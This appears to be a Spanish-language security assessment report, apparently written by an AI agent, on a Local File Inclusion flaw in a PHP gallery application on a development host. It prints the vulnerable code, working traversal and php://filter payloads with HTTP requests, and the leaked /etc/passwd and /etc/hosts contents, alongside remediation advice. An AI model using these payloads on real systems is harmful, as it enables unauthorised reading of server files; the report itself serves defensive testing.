# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-30  
**Hora:** 15:50:24  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)  

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite leer archivos arbitrarios del sistema de ficheros del servidor sin autenticación.

**Severidad:** 🔴 CRÍTICA  
**CVSS Score estimado:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

## Descripción de la Aplicación

- **Nombre:** Galería de Arte Virtual
- **Tecnología:** PHP
- **Puerto:** 8081
- **Páginas identificadas:** `gallery.php`, `index.php`

---

## Vulnerabilidad Encontrada

### LFI en parámetro `page` de `gallery.php`

**URL vulnerable:**
```
http://web.dev.local:8081/gallery.php?page=<VALOR>
```

**Descripción:**  
El parámetro `page` es utilizado directamente en una llamada `include()` de PHP sin una validación o sanitización adecuada. El código fuente (obtenido mediante PHP filter wrapper) revela la lógica vulnerable:

```php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    // ...
    // Try to include anyway
    @include($file);
}
```

**Problema:** Cuando el valor del parámetro contiene un `.` (punto), el valor se usa directamente como ruta de fichero sin ninguna validación, permitiendo path traversal con `../`.

---

## Explotación

### Vector de ataque

```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

### Técnicas utilizadas

1. **Path Traversal directo:** `../../../etc/passwd`
2. **PHP Filter (wrapper):** `php://filter/convert.base64-encode/resource=gallery.php`

### Pruebas de concepto exitosas

#### 1. Lectura de `/etc/passwd`
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/bin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

#### 2. Lectura de `/etc/hosts`
```
GET /gallery.php?page=../../../etc/hosts HTTP/1.1
```

**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
172.19.0.2   d5054e367753
```
> El servidor corre en la IP `172.19.0.2` dentro de una red Docker (`172.19.0.0/16`).

#### 3. Lectura del código fuente PHP via wrapper
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php HTTP/1.1
```

**Resultado:** Código fuente completo de `gallery.php` en Base64, confirmando la ausencia de controles de seguridad.

---

## Impacto

| Riesgo | Descripción |
|--------|-------------|
| **Exposición de datos sensibles** | Lectura de `/etc/passwd`, `/etc/hosts`, configuraciones del sistema |
| **Divulgación de código fuente** | Lectura de ficheros PHP mediante `php://filter` |
| **Reconocimiento de infraestructura** | Identificación de IPs internas y topología de red (Docker: `172.19.0.2`) |
| **Escalada potencial** | Con acceso a logs o ficheros con código controlable, posible escalada a RCE |

---

## Recomendaciones

1. **Validar y sanitizar el parámetro `page`:** Usar una lista blanca (`whitelist`) de valores permitidos (e.g., `modern`, `classic`, `abstract`, `about`).
2. **Evitar `include()` con datos del usuario:** Nunca pasar directamente input del usuario a funciones de inclusión de ficheros.
3. **Deshabilitar wrappers peligrosos de PHP:** Configurar `allow_url_include = Off` y considerar deshabilitar `php://filter` si no es necesario.
4. **Implementar controles de ruta:** Usar `realpath()` y verificar que la ruta resultante esté dentro del directorio permitido.
5. **Principio de mínimo privilegio:** El proceso web (`www-data`) no debería tener acceso de lectura a ficheros fuera del webroot.

---

## Conclusión

La aplicación presenta una vulnerabilidad **crítica de LFI** explotable de forma trivial y sin autenticación. Se ha demostrado la lectura exitosa de ficheros del sistema (`/etc/passwd`, `/etc/hosts`) y del código fuente PHP de la aplicación. Se recomienda remediación inmediata.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
